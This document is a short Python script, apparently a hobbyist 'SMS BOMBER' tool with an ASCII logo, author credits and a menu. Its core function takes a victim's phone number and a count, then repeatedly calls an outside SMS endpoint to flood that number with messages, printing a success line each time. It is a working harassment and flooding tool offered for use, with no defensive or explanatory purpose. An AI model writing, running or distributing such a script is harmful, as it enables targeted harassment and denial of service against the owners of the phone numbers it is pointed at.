#---------color code--------#
I='\033[1;32m'
Q="\x1b[00m"
dt = f"{Q}[{I}•{Q}]"
#---------import------------#
import os, sys
import requests
#--------logo-------------#
logo=("""  
           ____ _____ _____     __   __ __ ___  
     /\   |  _ \_   _|  __ \    \ \ / // // _ \ 
    /  \  | |_) || | | |__) |____\ V // /| (_) |
   / /\ \ |  _ < | | |  _  /______> <| '_ \__, |
  / ____ \| |_) || |_| | \ \     / . \ (_) |/ / 
 /_/    \_\____/_____|_|  \_\   /_/ \_\___//_/  
                                        
 """)
#-------clear------------#
def clear():
    os.system("clear")
    print(logo)
    print(22*f'{Q} -')
    print(f' {dt} CODER    : ABIR HOSSEN ')
    print(f' {dt} Facebook : Pbd Abir ')
    print(f' {dt} Github   : ABIR-X69')
    print(22*' -')
#-------line-------------#
def line():
    print(22*' -')
#---------menu-----------#
def menu():
  clear()
  print(f' {dt} [01] SMS BOMBER')
  print(f' {dt} [02] CONTRACT ADMIN')
  print(f' {dt} [03] JOIN Messenger')
  print(f' {dt} [04] EXIT')
  user = input(f' {dt} CHOICE OPTION : ')
  if user in ['01', '1']:
    sms()
  elif user in ['02', '2']:
    os.system('xdg-open t.me/Pbd_abir')
  elif user in ['03', '3']:
    os.system('xdg-open https://m.me/j/Aba0jCw6DJk8m9KT/')
  else:
    exit(' {dt} Thanks for useing my tools ')
#--------sms bomber---------#
def sms():
  clear()
  nmbr=input(f' {dt}ENTER NUMBER WITHOUT (+88) : ')
  line()
  msg=int(input(f' {dt}ENTER AMOUNT : '))
  line()
  for i in range(msg):
    api=f"https://api.teamdccs.xyz/sms.php?number={nmbr}"
    requests.get(api)
    line()
    print(str(i+1)+' SMS SENT SUCCESSFUL')
  print(f' {dt} SMS Bombing Successful')
#---------end---------#
menu()